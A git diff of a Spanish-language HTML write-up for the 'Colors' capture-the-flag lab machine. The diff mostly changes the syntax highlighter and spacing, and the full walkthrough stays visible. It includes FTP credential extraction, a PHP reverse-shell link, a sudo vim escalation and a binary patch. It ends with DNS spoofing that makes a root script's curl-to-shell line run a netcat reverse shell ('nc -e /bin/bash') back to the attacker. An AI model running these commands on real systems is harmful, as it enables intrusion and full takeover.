@@ -19,7 +19,9 @@
     <link rel="shortcut icon" href="../../assets/img/favicon.ico">
     
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
-    <link rel="stylesheet" href="../../assets/css/prism.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/default.min.css">
+    <link rel="stylesheet" href="../../assets/highlight/styles/vs2015.min.css">
+    <script src="../../assets/highlight/highlight.min.js"></script>
     <link rel="stylesheet" href="../../assets/css/hmv_w.css">  
 </head>
 <body>
@@ -45,7 +47,7 @@ PORT   STATE SERVICE
 80/tcp open  http</code></pre>
             <h3>Escaneo de servicios</h3>
             <pre class="pre">
-<code class="language-txt">nmap -sVC -p 21,80 10.10.1.49
+<code class="code language-txt">nmap -sVC -p 21,80 10.10.1.49
 
 PORT   STATE SERVICE VERSION
 /tcp open  ftp     vsftpd 3.0.3
@@ -71,9 +73,9 @@ ftp-anon: Anonymous FTP login allowed (FTP code 230)
 http-title: Document
 http-server-header: Apache/2.4.54 (Debian)
 Service Info: OS: Unix</code></pre>
-<p>Me conecto al<code class="code_negrita">&nbsp;FTP&nbsp;</code>y descargo<code class="code_negrita">&nbsp;secret.jpg</code>.</p>
+<p>Me conecto al<code class="code_negrita">&nbsp;FTP&nbsp;</code>y descargo<code class="code_negrita">&nbsp;secret.jpg&nbsp;</code>.</p>
 
-            <pre class="pre"><code class="language-txt">❯ ftp 10.10.1.49
+            <pre class="pre"><code class="code language-txt">❯ ftp 10.10.1.49
 
 ftp> ls -la
 200 PORT command successful. Consider using PASV.
@@ -87,20 +89,20 @@ drwxr-xr-x    2 0        0            4096 Feb 20 15:59 ..
 ftp> get secret.txt
 </code></pre>
             
-            <p>Uso la herramienta steegseek y encuentro un archivo de texto con el nombre<code class="code_negrita">&nbsp;more_secret.txt</code>.</p>
-            <pre class="pre"><code class="language-txt">❯ stegseek secret.jpg                
+            <p>Uso la herramienta steegseek y encuentro un archivo de texto con el nombre<code class="code_negrita">&nbsp;more_secret.txt&nbsp;</code>.</p>
+            <pre class="pre"><code class="code language-txt">❯ stegseek secret.jpg                
 [i] Found passphrase: "Nevermind"
 [i] Original filename: "more_secret.txt".
 [i] Extracting to "secret.jpg.out".</code></pre>
-            <p>Archivo<code class="code_negrita">&nbsp;secret.jpg.out</code>.</p>
+            <p>Archivo<code class="code_negrita">&nbsp;secret.jpg.out&nbsp;</code>.</p>
 
-            <pre class="pre"><code class="language-txt"><-MnkFEo!SARTV#+D,Y4D'3_7G9D0LFWbmBCht5'AKYi.Eb-A(Bld^%E,TH.FCeu*@X0)<BOr<.BPD?sF!,R<@<<W;Dfm15Bk2*/F<G+4+EV:*DBND6+EV:.+E)./F!,aHFWb4/A0>E$/g+)2+EV:;Dg*=BAnE0-BOr;qDg-#3DImlA+B)]_C`m/1@<iu-Ec5e;FD,5.F(&Zl+D>2(@W-9>+@BRZ@q[!,BOr<.Ea`Ki+EqO;A9/l-DBO4CF`JUG@;0P!/g*T-E,9H5AM,)nEb/Zr/g*PrF(9-3ATBC1E+s3*3`'O.CG^*/BkJ\:</code></pre>
+            <pre class="pre"><code class="code language-txt"><-MnkFEo!SARTV#+D,Y4D'3_7G9D0LFWbmBCht5'AKYi.Eb-A(Bld^%E,TH.FCeu*@X0)<BOr<.BPD?sF!,R<@<<W;Dfm15Bk2*/F<G+4+EV:*DBND6+EV:.+E)./F!,aHFWb4/A0>E$/g+)2+EV:;Dg*=BAnE0-BOr;qDg-#3DImlA+B)]_C`m/1@<iu-Ec5e;FD,5.F(&Zl+D>2(@W-9>+@BRZ@q[!,BOr<.Ea`Ki+EqO;A9/l-DBO4CF`JUG@;0P!/g*T-E,9H5AM,)nEb/Zr/g*PrF(9-3ATBC1E+s3*3`'O.CG^*/BkJ\:</code></pre>
             
-            <p>Está codificado<code class="code_negrita">&nbsp;base85</code>, una vez decodificado obtengo en siguiente mensaje y unas credenciales al final.</p>
-            <p><em>Twenty years from now you will be more disappointed by the things that you didn't do than by the ones you did do. So throw off the bowlines. Sail away from the safe harbor. Catch the trade winds in your sails. Explore. Dream. Discover.<code class="code_negrita">&nbsp;pink:Pink4sPig$$</code>.</em></p>
+            <p>Está codificado<code class="code_negrita">&nbsp;base85&nbsp;</code>, una vez decodificado obtengo en siguiente mensaje y unas credenciales al final.</p>
+            <p><em>Twenty years from now you will be more disappointed by the things that you didn't do than by the ones you did do. So throw off the bowlines. Sail away from the safe harbor. Catch the trade winds in your sails. Explore. Dream. Discover.<code class="code_negrita">&nbsp;pink:Pink4sPig$$&nbsp;</code>.</em></p>
            
-             <p>Me conecto al<code class="code_negrita">&nbsp;FTP&nbsp;</code>de nuevo con el usuario<code class="code_negrita">&nbsp;pink</code>.</p>
-            <pre class="pre"><code class="language-txt">ftp> ls
+             <p>Me conecto al<code class="code_negrita">&nbsp;FTP&nbsp;</code>de nuevo con el usuario<code class="code_negrita">&nbsp;pink&nbsp;</code>.</p>
+            <pre class="pre"><code class="code language-txt">ftp> ls
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
 drwx------    2 1127     1127         4096 Feb 11 19:55 green
@@ -109,7 +111,7 @@ drwx------    2 1081     1081         4096 Feb 20 16:07 purple
 drwx------    2 1039     1039         4096 Feb 11 19:56 red</code></pre>
             
             <p>Entro en la carpeta<code class="code_negrita">&nbsp;pink&nbsp;</code>por que en las demás carpetas no tenemos permiso.</p>
-            <pre class="pre"><code class="language-txt">drwx------    3 1000     1000         4096 Feb 11 19:18 .
+            <pre class="pre"><code class="code language-txt">drwx------    3 1000     1000         4096 Feb 11 19:18 .
 drwxr-xr-x    6 0        0            4096 Jan 27 22:44 ..
 lrwxrwxrwx    1 1000     1000            9 Jan 27 20:30 .bash_history -> /dev/null
 -rwx------    1 1000     1000          220 Jan 27 20:22 .bash_logout
@@ -120,36 +122,36 @@ drwx------    2 1000     1000         4096 Feb 11 19:55 .ssh
 -rw-r--r--    1 1000     1000           23 Feb 11 16:59 note.txt</code></pre>
 
 
-            <p>Me llama la atención la carpeta<code class="code_negrita">&nbsp;.ssh&nbsp;</code>porque en el reconocimiento de puertos no me detectó el puerto 22. Así que vuelvo a escanear los puertos sin la flag<code class="code_negrita">&nbsp;--open</code>.</p>
-            <pre class="pre"><code class="language-txt">❯ nmap -p- -T5 -v -n 10.10.1.49
+            <p>Me llama la atención la carpeta<code class="code_negrita">&nbsp;.ssh&nbsp;</code>porque en el reconocimiento de puertos no me detectó el puerto 22. Así que vuelvo a escanear los puertos sin la flag<code class="code_negrita">&nbsp;--open&nbsp;</code>.</p>
+            <pre class="pre"><code class="code language-txt">❯ nmap -p- -T5 -v -n 10.10.1.49
 PORT   STATE    SERVICE
 21/tcp open     ftp
 22/tcp filtered ssh
 80/tcp open     http</code></pre>
 
-            <p>Encuentra el puerto 22 filtrado, está filtrado para<code class="code_negrita">&nbsp;IPv4&nbsp;</code>lo podemos abrir mediante la técnica de<code class="code_negrita">&nbsp;Port Knocking</code>pero en este writeup accederé al sistema por<code class="code_negrita">&nbsp;IPv6</code>. Hago un barrido con<code class="code_negrita">&nbsp;ping6&nbsp;</code>en busca de direcciones<code class="code_negrita">&nbsp;IPv6&nbsp;</code>y encuentro la siguiente dirección:</p>
+            <p>Encuentra el puerto 22 filtrado, está filtrado para<code class="code_negrita">&nbsp;IPv4&nbsp;</code>lo podemos abrir mediante la técnica de<code class="code_negrita">&nbsp;Port Knocking</code>pero en este writeup accederé al sistema por<code class="code_negrita">&nbsp;IPv6&nbsp;</code>. Hago un barrido con<code class="code_negrita">&nbsp;ping6&nbsp;</code>en busca de direcciones<code class="code_negrita">&nbsp;IPv6&nbsp;</code>y encuentro la siguiente dirección:</p>
 
             <p></p>
-            <pre class="pre"><code class="language-txt">❯ ping6 -c2 -n -I enp0s3 ff02::1
+            <pre class="pre"><code class="code language-txt">❯ ping6 -c2 -n -I enp0s3 ff02::1
 64 bytes from fe80::a00:27ff:fe06:f767%enp0s3: icmp_seq=1 ttl=64 time=0.607 ms
 </code></pre>
             <p>Antes de conectarme por ssh, he creado un archivo<code class="code_negrita">&nbsp;authorized_keys&nbsp;</code>dentro del archivo he copiado mi<code class="code_negrita">&nbsp;id_rsa.pub&nbsp;</code>de mi máquina y luego lo he subido a la carpeta<code class="code_negrita">&nbsp;.ssh&nbsp;</code>del usuario pink a través del servidor ftp</p>
 
             <p>Me conecto al sistema a través del servicio SSH.</p>
-            <pre class="pre"><code class="language-txt">ssh -6 pink@fe80::a00:27ff:fe06:f767%enp0s3
+            <pre class="pre"><code class="code language-txt">ssh -6 pink@fe80::a00:27ff:fe06:f767%enp0s3
 pink@color:~$ id
 uid=1000(pink) gid=1000(pink) groups=1000(pink),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
 </code></pre>
             <p>Leyendo el archivo<code class="code_negrita">&nbsp;.viminfo&nbsp;</code>
             observo que ha habido movimiento en la ruta<code class="code_negrita">&nbsp;/var/www/html&nbsp;</code>me desplazo a ella y observo que puedo crear archivos, creo un archivo php malicioso para obtener una shell. Aquí abajo te dejo el enlace de la reverse-shell que he usado:</p>
-            <pre class="pre"><code class="language-txt">http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
+            <pre class="pre"><code class="code language-txt">http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
 </code></pre>
             
             <p>Desde una terminal uso curl para mandar una petición al fichero php malicioso.</p>
-            <pre class="pre"><code class="language-txt"> ❯ curl -s 10.10.1.49/noname.php
+            <pre class="pre"><code class="code language-txt"> ❯ curl -s 10.10.1.49/noname.php
 </code></pre>
-            <p>Obtengo la shell como usuario <code class="code_negrita">&nbsp;www-data</code>.</p>
-            <pre class="pre"><code class="language-txt"> ❯ nc -lvp 1337
+            <p>Obtengo la shell como usuario <code class="code_negrita">&nbsp;www-data&nbsp;</code>.</p>
+            <pre class="pre"><code class="code language-txt"> ❯ nc -lvp 1337
 listening on [any] 1337 ...
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 pink     pts/0    fe80::a999:aaa9: 15:55   45.00s  0.03s  0.03s -bash
@@ -160,15 +162,15 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </code></pre>
 
             <p>Después de hacer un tratamiento para la tty lanzo un sudo -l.</p>
-<pre class="pre"><code class="language-txt">www-data@color:/home$ sudo -l
+<pre class="pre"><code class="code language-txt">www-data@color:/home$ sudo -l
 User www-data may run the following commands on color:
     (green) NOPASSWD: /usr/bin/vim
 </code></pre>
             <p>Para pivotar del usuario <code class="code_negrita">&nbsp;www-data&nbsp;</code>al usuario<code class="code_negrita">&nbsp;green&nbsp;</code>he usado el recurso gtfobins:</p>
-            <pre class="pre"><code class="language-txt">sudo -u green vim -c ':!/bin/bash'
+            <pre class="pre"><code class="code language-txt">sudo -u green vim -c ':!/bin/bash'
 </code></pre>
             <p>Como usuario green lanzo de nuevo un ls y luego un cat al fichero note.txt.</p>
-            <pre class="pre"><code class="language-txt">green@color:~$ ls -la
+            <pre class="pre"><code class="code language-txt">green@color:~$ ls -la
 total 44
 drwx------ 2 green green  4096 Feb 11 19:55 .
 drwxr-xr-x 6 root  root   4096 Jan 27 22:44 ..
@@ -186,14 +188,14 @@ You've been working very well lately Green, so I'm going to give you one ltest. 
 </code></pre>
 
             <p>Lanzo <code class="code_negrita">&nbsp;test_4_all&nbsp;</code>para ver de que se trata.</p>
-        <pre class="pre"><code class="language-txt">green@color:~$ ./test_4_green
+        <pre class="pre"><code class="code language-txt">green@color:~$ ./test_4_green
 Guess the number im thinking: 1337
 Nope, sorry</code></pre>
 
             <p>Tenemos que adivinar el número para que nos de la contraseña de purple, para ello usaré radare para analizar el binario y parchear la zona donde nos pide que introduzcamos un número para que al poner cualquier número lo acepte como válido y nos muestre la contraseña para purple.</p>
 
             <p>Abro el binario con permisos de escritura.</p>
-        <pre class="pre"><code class="language-txt">❯ r2 -w ./test_4_green</code></pre>
+        <pre class="pre"><code class="code language-txt">❯ r2 -w ./test_4_green</code></pre>
             <p>Pulso<code class="code_negrita">&nbsp;V&nbsp;</code>y depués enter.</p>
         <img src="../../assets/img/hmv_colors/r2V.png" alt="r2V">
 
@@ -206,33 +208,33 @@ Nope, sorry</code></pre>
         <img class="img_b" src="../../assets/img/hmv_colors/r2P2.png" alt="r2P2">
          <p>Con las flechas "arriba y abajo" nos movemos hasta la dirección<code class="code_negrita">&nbsp;0x00001257&nbsp;</code>es importante que la dirección<code class="code_negrita">&nbsp;0x00001257&nbsp;</code>esté marcada en amarillo como se ve en la imagen en el "recuadro" amarillo.</p>
         <img class="img_b" src="../../assets/img/hmv_colors/r2P3_2.png" alt="r2P3">
-            <p>Pulsamos <code class="code_negrita">&nbsp;shift+a&nbsp;</code>y escribimos<code class="code_negrita">&nbsp;je 0x12cb</code>.</p>
+            <p>Pulsamos <code class="code_negrita">&nbsp;shift+a&nbsp;</code>y escribimos<code class="code_negrita">&nbsp;je 0x12cb&nbsp;</code>.</p>
         <img class="img_m" src="../../assets/img/hmv_colors/r2A.png" alt="r2A">
-            <p>Pulsamos enter, guardamos cambios<code class="code_negrita">&nbsp;Y</code>.</p>
+            <p>Pulsamos enter, guardamos cambios<code class="code_negrita">&nbsp;Y&nbsp;</code>.</p>
         <img class="img_s" src="../../assets/img/hmv_colors/r2Asavey.png" alt="r2Asavey">
-            <p>Para salir del programa:<code class="code_negrita">&nbsp;q</code>,<code class="code_negrita">&nbsp;q</code>, <code class="code_negrita">enter</code>.</p>
+            <p>Para salir del programa:<code class="code_negrita">&nbsp;q&nbsp;</code>,<code class="code_negrita">&nbsp;q&nbsp;</code>,<code class="code_negrita">&nbsp;enter&nbsp;</code>.</p>
             <p>Lanzo <code class="code_negrita">&nbsp;./test_4_all&nbsp;</code>y le pongo cualquier número.</p>
-        <pre class="pre"><code class="language-txt">❯ ./test_4_green
+        <pre class="pre"><code class="code language-txt">❯ ./test_4_green
 Guess the number im thinking: 12
 Correct!! Here is the pass:
 p************</code></pre>
 
 
             <p>Una vez conectado como purple obtengo la flag de user.</p>
-        <pre class="pre"><code class="language-txt">purple@color:~$ cat user.txt 
+        <pre class="pre"><code class="code language-txt">purple@color:~$ cat user.txt 
 (:**_******:)</code></pre>
 
-            <p>Archivo<code class="code_negrita">&nbsp;for_purple_only</code>.</p>
+            <p>Archivo<code class="code_negrita">&nbsp;for_purple_only&nbsp;</code>.</p>
 
 
 
-        <pre class="pre"><code class="language-txt">purple@color:~$ cat for_purple_only.txt 
+        <pre class="pre"><code class="code language-txt">purple@color:~$ cat for_purple_only.txt 
 As the highest level user I allow you to use the supreme ddos attack script.
 </code></pre>
 
             <p>El usuario purple puede ejecutar<code class="code_negrita">&nbsp;/attack/ddos.sh&nbsp;</code>como root</p>
 
-        <pre class="pre"><code class="language-txt">purple@color:~$ sudo -l
+        <pre class="pre"><code class="code language-txt">purple@color:~$ sudo -l
 Matching Defaults entries for purple on color:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -243,19 +245,19 @@ User purple may run the following commands on color:
 
             <p>El archivo ddos.sh hace una petición con curl al dominio masterddos.hmv y luego lanza attack.sh</p>
 
-        <pre class="pre"><code class="language-txt">#!/bin/bash
+        <pre class="pre"><code class="code language-txt">#!/bin/bash
 /usr/bin/curl http://masterddos.hmv/attack.sh | /usr/bin/sh -p</code></pre>
             <h3>r00t</h3>
             <p>Mediante la técnica <code class="code_negrita">&nbsp;DNS Spoofing&nbsp;</code>simularemos ser el dominio masterddos.hmv para que el archivo ddos.sh funcione correctamente y nos devuelva una shell.</p>
             <p>Con ettercap se puede hacer DNS Spoofing y hay mucha información de como se configura para realizar el ataque con lo cual me saltaré estos pasos.</p>
             <p>En la máquina atacante, creo el archivo <code class="code_negrita">&nbsp;attack.sh&nbsp;</code>en <code class="code_negrita">&nbsp;/var/www/html&nbsp;</code>y le pongo un netcat apuntando a mi dirección ip.</p>
-            <pre class="pre"><code class="language-txt">#!/bin/bash
+            <pre class="pre"><code class="code language-txt">#!/bin/bash
 nc -e /bin/bash 10.10.1.40 4444</code></pre>
             <p>Levanto el servicio apache, dejo un listener con el puerto 4444 a la escucha, inicio el DNS Spoofing con ettercap y finalmente lanzo el script ddos.sh</p>
 
 <img class="img_b" src="../../assets/img/hmv_colors/ettercapG.png" alt="masterddos">
             <p>Obtengo la shell.</p> 
-<pre class="pre"><code class="language-txt">❯ nc -lvp 4444
+<pre class="pre"><code class="code language-txt">❯ nc -lvp 4444
 listening on [any] 4444 ...
 10.10.1.49: inverse host lookup failed: Unknown host
 connect to [10.10.1.40] from (UNKNOWN) [10.10.1.49] 33018
@@ -263,28 +265,30 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre>
             <p>Flag de root.</p>
-<pre class="pre"><code class="language-txt"></code>root@color:~# cat root.txt
+<pre class="pre"><code class="code language-txt">root@color:~# cat root.txt
 
-I hope you liked it :)
+    I hope you liked it :)
+    Here, some chocolate and the flag:
+    (:go_****_****_*********:)
+    
+        ___  ___  ___  ___  ___.---------------.
+      .'\__\'\__\'\__\'\__\'\__,`   .  ____ ___ \
+      |\/ __\/ __\/ __\/ __\/ _:\   |:.  \  \___ \
+       \\'\__\'\__\'\__\'\__\'\_`.__|  `. \  \___ \
+        \\/ __\/ __\/ __\/ __\/ __:                \
+         \\'\__\'\__\'\__\ \__\'\_;-----------------`
+          \\/   \/   \/   \/   \/ :                 |
+           \|______________________;________________|
 
-Here, some chocolate and the flag:
+</code></pre>
 
-(:go_****_****_*********:)
-
-    ___  ___  ___  ___  ___.---------------.
-  .'\__\'\__\'\__\'\__\'\__,`   .  ____ ___ \
-  |\/ __\/ __\/ __\/ __\/ _:\   |:.  \  \___ \
-   \\'\__\'\__\'\__\'\__\'\_`.__|  `. \  \___ \
-    \\/ __\/ __\/ __\/ __\/ __:                \
-     \\'\__\'\__\'\__\ \__\'\_;-----------------`
-      \\/   \/   \/   \/   \/ :                 |
-       \|______________________;________________|</code></pre>
 
             <p>Y aquí termina Colors la primera y maravillosa máquina del sr Pablo.</p>
     </main>
         <footer class="footer">
             <a class="a_footer" href="https://github.com/0x-noname" target="_blank"># noname &copy; 2023<i class="i_footer bi bi-github"></i></a>
         </footer>
-        <script src="../../assets/js/prism.js"></script>  
+        <script src="../../assets/highlight/highlight.min.js"></script>
+            <script>hljs.initHighlightingOnLoad();</script> 
 </body>
 </html>
